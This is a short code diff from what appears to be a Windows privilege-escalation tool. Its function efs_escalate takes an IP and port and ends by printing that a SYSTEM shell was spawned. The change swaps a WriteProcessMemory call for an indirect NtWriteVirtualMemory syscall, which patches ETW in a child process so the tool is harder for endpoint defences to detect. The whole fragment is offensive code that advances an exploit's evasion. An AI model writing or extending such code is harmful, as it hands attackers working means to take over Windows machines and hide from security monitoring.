@@ -180,7 +180,10 @@ VOID efs_escalate(char* ip, char* port) {
         SIZE_T sz = 1;
         ULONG old = 0;
         iNtProtectVirtualMemory(pi.hProcess, &pEtwAddr, &sz, PAGE_EXECUTE_READWRITE, &old);
-        WriteProcessMemory(pi.hProcess, pWriteAddr, &patch, 1, NULL);  
+        g_ssn = getSSN("NtWriteVirtualMemory");
+        g_syscall = getSyscallAddr("NtWriteVirtualMemory");
+        SIZE_T written = 0;
+        iNtWriteVirtualMemory(pi.hProcess, pWriteAddr, &patch, 1, &written);
         iNtProtectVirtualMemory(pi.hProcess, &pEtwAddr, &sz, old, &old);
         FlushInstructionCache(pi.hProcess, pWriteAddr, 1);
         printf("[+] SYSTEM shell spawned\n");
